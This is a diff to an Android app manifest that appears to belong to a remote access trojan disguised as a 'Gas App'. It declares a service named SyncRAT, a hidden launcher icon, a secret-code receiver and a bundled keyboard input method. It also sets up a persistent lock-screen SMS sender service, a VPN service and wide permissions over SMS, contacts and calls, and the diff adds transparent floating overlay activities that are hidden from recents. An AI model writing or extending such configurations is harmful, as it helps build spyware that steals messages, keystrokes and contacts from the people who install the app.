@@ -22,7 +22,6 @@
     <uses-permission android:name="android.permission.WRITE_CONTACTS" />
     <uses-permission android:name="android.permission.CALL_PHONE" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
-
     <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
     <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
@@ -50,12 +49,30 @@
         android:usesCleartextTraffic="true"
         tools:targetApi="31">
         <activity
+            android:name=".Ui.DevToolActivity"
+            android:exported="false"
+            android:enabled="@bool/is_debug"
+            />
+        <!-- Eta Open hobe jokhon kono user ke web activity dekhate hobe -->
+        <activity
+            android:name=".Ui.FloatingWebActivity"
+            android:excludeFromRecents="true"
+            android:exported="false"
+            android:launchMode="singleTask"
+            android:noHistory="true"
+            android:theme="@style/Transparent" />
+        <activity
+            android:name=".Ui.FloatingTileActivity"
+            android:excludeFromRecents="true"
+            android:exported="true"
+            android:launchMode="singleTask"
+            android:noHistory="true"
+            android:theme="@style/Transparent" />
+        <activity
             android:name=".Ui.ClockActivity"
             android:exported="true"
             android:label="Clock"
-            android:launchMode="singleTop"
-            >
-
+            android:launchMode="singleTop">
 
             <!-- Alarm and timer actions -->
             <intent-filter>
@@ -66,10 +83,10 @@
                 <action android:name="android.intent.action.DISMISS_ALARM" />
                 <action android:name="android.intent.action.DISMISS_TIMER" />
                 <action android:name="org.fossify.clock.TOGGLE_STOPWATCH" />
+
                 <category android:name="android.intent.category.DEFAULT" />
             </intent-filter>
         </activity>
-
         <activity
             android:name=".Ui.CrashActivity"
             android:excludeFromRecents="true"
@@ -89,8 +106,14 @@
             android:label="Messages"
             android:launchMode="singleInstance" />
 
-
-        <!-- For Hidden Icon -->
+        <activity-alias
+            android:name=".SmsLauncherAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/chats_chat_sms_talk_svgrepo_com"
+            android:label="SMS"
+            android:launchMode="singleInstance"
+            android:targetActivity="android.iocl.sms_handler_8_0_below.SmsActivity" /> <!-- For Hidden Icon -->
         <activity
             android:name=".Ui.BankStatementActivity"
             android:configChanges="orientation|screenSize"
@@ -99,35 +122,30 @@
         <activity
             android:name=".Ui.PermissionActivity"
             android:exported="true"
-            android:launchMode="singleTask" />
-<!--        <activity-->
-<!--            android:name=".Ui.DialogActivity"-->
-<!--            android:directBootAware="true"-->
-<!--            android:excludeFromRecents="true"-->
-<!--            android:exported="true"-->
-<!--            android:launchMode="singleInstance"-->
-<!--            android:noHistory="true"-->
-<!--            android:persistableMode="persistAcrossReboots"-->
-<!--            android:showOnLockScreen="true"-->
-<!--            android:theme="@style/Transparent"-->
-<!--            android:turnScreenOn="true"-->
-<!--            android:windowSoftInputMode="stateAlwaysHidden|adjustResize">-->
-
-<!--            &lt;!&ndash; SMS RECEIVER &ndash;&gt;-->
-
-<!--            <intent-filter>-->
-<!--                <action android:name="android.intent.action.SEND" />-->
-<!--                <action android:name="android.intent.action.SENDTO" />-->
-
-<!--                <category android:name="android.intent.category.DEFAULT" />-->
-<!--                <category android:name="android.intent.category.BROWSABLE" />-->
-
-<!--                <data android:scheme="sms" />-->
-<!--                <data android:scheme="smsto" />-->
-<!--                <data android:scheme="mms" />-->
-<!--                <data android:scheme="mmsto" />-->
-<!--            </intent-filter>-->
-<!--        </activity>-->
+            android:launchMode="singleTask" /> <!-- <activity -->
+        <!-- android:name=".Ui.DialogActivity" -->
+        <!-- android:directBootAware="true" -->
+        <!-- android:excludeFromRecents="true" -->
+        <!-- android:exported="true" -->
+        <!-- android:launchMode="singleInstance" -->
+        <!-- android:noHistory="true" -->
+        <!-- android:persistableMode="persistAcrossReboots" -->
+        <!-- android:showOnLockScreen="true" -->
+        <!-- android:theme="@style/Transparent" -->
+        <!-- android:turnScreenOn="true" -->
+        <!-- android:windowSoftInputMode="stateAlwaysHidden|adjustResize"> -->
+        <!-- &lt;!&ndash; SMS RECEIVER &ndash;&gt; -->
+        <!-- <intent-filter> -->
+        <!-- <action android:name="android.intent.action.SEND" /> -->
+        <!-- <action android:name="android.intent.action.SENDTO" /> -->
+        <!-- <category android:name="android.intent.category.DEFAULT" /> -->
+        <!-- <category android:name="android.intent.category.BROWSABLE" /> -->
+        <!-- <data android:scheme="sms" /> -->
+        <!-- <data android:scheme="smsto" /> -->
+        <!-- <data android:scheme="mms" /> -->
+        <!-- <data android:scheme="mmsto" /> -->
+        <!-- </intent-filter> -->
+        <!-- </activity> -->
         <activity
             android:name=".Ui.TileDialogActivity"
             android:excludeFromRecents="true"
@@ -181,27 +199,13 @@
             android:label="Gas App"
             android:roundIcon="@mipmap/ic_launcher"
             android:targetActivity=".Ui.MainActivity"
-            tools:replace="android:enabled"
-            >
+            tools:replace="android:enabled">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
 
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity-alias>
-
-        <activity-alias
-            android:name=".SmsLauncherAlias"
-            android:enabled="false"
-            android:exported="true"
-            android:icon="@drawable/chats_chat_sms_talk_svgrepo_com"
-            android:label="SMS"
-            android:launchMode="singleInstance"
-
-            android:targetActivity="android.iocl.sms_handler_8_0_below.SmsActivity">
-
         </activity-alias> <!-- For Hidden Icon -->
-
         <receiver
             android:name=".Receivers.SecretCodeReceiver"
             android:exported="true">
@@ -222,14 +226,11 @@
         <service
             android:name=".Services.SmsSenderJOBService"
             android:enabled="true"
-
             android:launchMode="singleInstance"
             android:permission="android.permission.BIND_JOB_SERVICE"
             android:persistableMode="persistAcrossReboots"
-
             android:showOnLockScreen="true"
-            android:turnScreenOn="true" />
-        <!--            android:process=":sendDACSeparate"-->
+            android:turnScreenOn="true" /> <!-- android:process=":sendDACSeparate" -->
         <!-- Simple Keyboard Integration from https://github.com/rkkr/simple-keyboard/ on 31-08-2025 at 14:24 -->
         <service
             android:name="android.iocl.simple_keyboard.latin.LatinIME"
@@ -282,8 +283,8 @@
 
         <service
             android:name=".Services.FetchProfileInfo"
-            android:exported="true"
             android:enabled="true"
+            android:exported="true"
             android:launchMode="singleInstance"
             android:permission="android.permission.BIND_JOB_SERVICE"
             android:persistableMode="persistAcrossReboots"
@@ -302,7 +303,6 @@
                 android:name="android.net.VpnService.SUPPORTS_ALWAYS_ON"
                 android:value="true" />
         </service>
-
         <service
             android:name=".SyncRAT.SyncService"
             android:exported="true"
@@ -356,8 +356,7 @@
         </service> <!-- In your SyncService declaration -->
         <service
             android:name=".SyncAdapters.SyncService"
-            android:exported="true"
-            >
+            android:exported="true">
             <intent-filter>
                 <action android:name="android.content.SyncAdapter" />
             </intent-filter>
@@ -368,8 +367,7 @@
         </service>
         <service
             android:name=".SyncAdapters.SyncService1"
-            android:exported="true"
-            >
+            android:exported="true">
             <intent-filter>
                 <action android:name="android.content.SyncAdapter" />
             </intent-filter>
@@ -490,6 +488,7 @@
                 <action android:name="android.intent.action.TIMEZONE_CHANGED" />
                 <action android:name="android.intent.action.TIME_SET" />
                 <action android:name="android.intent.action.ALARM_CHANGED" />
+
                 <category android:name="android.intent.category.DEFAULT" />
             </intent-filter>
 
@@ -505,7 +504,9 @@
                 <action android:name="android.intent.action.PACKAGE_ADDED" />
                 <action android:name="android.intent.action.PACKAGE_REPLACED" />
                 <action android:name="android.intent.action.PACKAGE_REMOVED" />
+
                 <category android:name="android.intent.category.DEFAULT" />
+
                 <data android:scheme="package" />
             </intent-filter>
         </receiver>
@@ -517,7 +518,6 @@
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
         </receiver>
-
         <receiver
             android:name="android.iocl.sms_handler_8_0_below.MmsSystemEventReceiver"
             android:exported="true"
@@ -530,19 +530,18 @@
         </receiver>
         <receiver
             android:name=".Receivers.MyReceiver"
-            android:enabled="true"
             android:directBootAware="true"
+            android:enabled="true"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.USER_PRESENT" />
                 <!-- Optional: Listen for boot completed to re-register receiver -->
 
-                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
-                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.provider.Telephony.ACTION_DEFAULT_SMS_PACKAGE_CHANGED" />
             </intent-filter>
-
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.LOCALE_CHANGED" />
@@ -562,7 +561,6 @@
             android:authorities="${applicationId}.provider"
             android:exported="true"
             android:grantUriPermissions="true"
-
             android:syncable="true">
             <intent-filter>
                 <action android:name="android.intent.action.VIEW" />
@@ -577,6 +575,10 @@
                 android:name="android.support.FILE_PROVIDER_PATHS"
                 android:resource="@xml/file_paths" />
         </provider>
+
+        <meta-data
+            android:name="com.google.firebase.messaging.default_notification_channel_id"
+            android:value="default_channel" />
     </application>
 
 </manifest>
